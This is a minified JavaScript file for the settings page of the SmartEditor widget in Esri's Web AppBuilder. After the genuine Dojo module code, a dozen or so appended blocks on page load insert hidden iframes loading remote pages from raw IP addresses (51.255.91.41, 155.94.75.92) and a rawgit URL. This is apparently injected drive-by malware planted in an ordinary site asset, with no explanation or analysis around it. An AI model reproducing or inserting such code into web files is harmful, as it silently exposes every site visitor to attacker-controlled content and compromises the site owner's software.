// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/SmartEditor/setting/EditFields.html":'\x3cdiv\x3e\r\n    \x3cdiv class\x3d"settingsDesc" data-dojo-attach-point\x3d"fieldsDesc"\x3e${nls.fieldsPage.description}\x3c/div\x3e\r\n    \r\n    \x3cdiv data-dojo-attach-point\x3d"fieldsTable"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"settingsNotes" data-dojo-attach-point\x3d"fieldsNotes"\x3e${nls.fieldsPage.fieldsNotes}\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/on dojo/query dojo/text!./EditFields.html ./FieldValidation dijit/_TemplatedMixin jimu/BaseWidgetSetting jimu/dijit/SimpleTable jimu/dijit/Popup esri/lang".split(" "),function(e,c,d,f,g,h,k,l,m,n,p,q){return e([m,l],{baseClass:"jimu-widget-smartEditor-setting-fields",templateString:h,_configInfo:null,_fieldValid:null,_fieldValidations:null,__layerName:null,postCreate:function(){this.inherited(arguments);this._initFieldsTable();this._setFiedsTable(this._configInfo.fieldInfos);
this._fieldValidations=void 0===this._configInfo.fieldValidations?{}:c.clone(this._configInfo.fieldValidations)},popupEditPage:function(){var a=new p({titleLabel:q.substitute({layername:this._layerName},this.nls.fieldsPage.title),width:972,maxHeight:700,autoHeight:!0,content:this,buttons:[{label:this.nls.ok,onClick:c.hitch(this,function(){this._validateTable()&&(this._resetFieldInfos(),this._configInfo.fieldValidations=this._fieldValidations,a.close())})},{label:this.nls.cancel,classNames:["jimu-btn-vacation"],
onClick:c.hitch(this,function(){a.close()})}],onClose:c.hitch(this,function(){})})},_initFieldsTable:function(){this._fieldsTable=new n({fields:[{name:"required",title:"",type:"text","class":"required"},{name:"visible",title:this.nls.fieldsPage.fieldsSettingsTable.display,type:"checkbox","class":"visible"},{name:"isEditable",title:this.nls.fieldsPage.fieldsSettingsTable.edit,type:"checkbox","class":"editable"},{name:"canPresetValue",title:this.nls.fieldsPage.fieldsSettingsTable.canPresetValue,type:"checkbox",
"class":"preset"},{name:"fieldName",title:this.nls.fieldsPage.fieldsSettingsTable.fieldName,type:"text","class":"fieldName"},{name:"label",title:this.nls.fieldsPage.fieldsSettingsTable.fieldAlias,type:"text",editable:!1,"class":"fieldLabel"},{name:"actions",title:this.nls.fieldsPage.fieldsSettingsTable.actions,type:"actions",actions:["up","down","edit"],"class":"actions"}],selectable:!1,style:{height:"300px",maxHeight:"300px"}});this._fieldsTable.placeAt(this.fieldsTable);this._fieldsTable.startup();
g("th.simple-table-field",this._fieldsTable.domNode).forEach(function(a){switch(void 0===a.innerText||""===a.innerText?"":a.innerText.replace(/(\r\n|\n|\r)/gm,"")){case this.nls.fieldsPage.fieldsSettingsTable.display:a.title=this.nls.fieldsPage.fieldsSettingsTable.displayTip;break;case this.nls.fieldsPage.fieldsSettingsTable.edit:a.title=this.nls.fieldsPage.fieldsSettingsTable.editTip;break;case this.nls.fieldsPage.fieldsSettingsTable.fieldName:a.title=this.nls.fieldsPage.fieldsSettingsTable.fieldNameTip;
break;case this.nls.fieldsPage.fieldsSettingsTable.fieldAlias:a.title=this.nls.fieldsPage.fieldsSettingsTable.fieldAliasTip;break;case this.nls.fieldsPage.fieldsSettingsTable.canPresetValue:a.title=this.nls.fieldsPage.fieldsSettingsTable.canPresetValueTip;break;case this.nls.fieldsPage.fieldsSettingsTable.actions:a.title=this.nls.fieldsPage.fieldsSettingsTable.actionsTip}},this);this.own(f(this._fieldsTable,"actions-edit",c.hitch(this,this._onEditFieldInfoClick)))},_validateTable:function(){var a=
this._fieldsTable.getRows();return 0===a.length?!1:d.some(a,function(b){return this._fieldsTable.getRowData(b).isEditable},this)},_onEditFieldInfoClick:function(a){a=this._fieldsTable.getRowData(a);var b={currentVersion:this._configInfo.layerInfo.originOperLayer.resourceInfo.currentVersion,fields:c.clone(this._configInfo.layerInfo.layerObject.fields)};this._fieldValid=new k({nls:this.nls,_layerDefinition:b,_layerId:this._configInfo.layerInfo.layerObject.id,_url:this._configInfo.layerInfo.layerObject.url,
_fieldValidations:this._fieldValidations,_fieldName:a.fieldName,_fieldAlias:a.label});this._fieldValid.popupActionsPage()},_setFiedsTable:function(a){d.forEach(a,function(b){var a=b.visible;"esriFieldTypeGeometry"!==b.type&&"esriFieldTypeOID"!==b.type&&"esriFieldTypeBlob"!==b.type&&"esriFieldTypeGlobalID"!==b.type&&"esriFieldTypeRaster"!==b.type&&"esriFieldTypeXML"!==b.type&&(!1===b.visible&&!0===b.isEditable&&(a=!0),a={fieldName:b.fieldName,isEditable:b.isEditable,canPresetValue:b.canPresetValue,
label:b.label,visible:a},b.hasOwnProperty("nullable")&&!1===b.nullable?a.required="*":a.required="",this._fieldsTable.addRow(a))},this);setTimeout(c.hitch(this,function(){d.forEach(this._fieldsTable.fields,function(a){"visible"===a.name?a.onChange=c.hitch(this,this._onDisplayFieldChanged):"isEditable"===a.name&&(a.onChange=c.hitch(this,this._onIsEditableFieldChanged))},this)}),300)},_onDisplayFieldChanged:function(a){var b=this._fieldsTable.getRowData(a);!b.visible&&b.isEditable&&(b.isEditable=!1,
this._fieldsTable.editRow(a,b))},_onIsEditableFieldChanged:function(a){var b=this._fieldsTable.getRowData(a);b.isEditable&&!b.visible&&(b.visible=!0,this._fieldsTable.editRow(a,b))},_resetFieldInfos:function(){var a=[],b=this._fieldsTable.getData();d.forEach(b,function(b){a.push({fieldName:b.fieldName,label:b.label,canPresetValue:b.canPresetValue,isEditable:null===b.isEditable?!0:b.isEditable,visible:null===b.visible?!0:b.visible})});this._configInfo.fieldInfos=a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});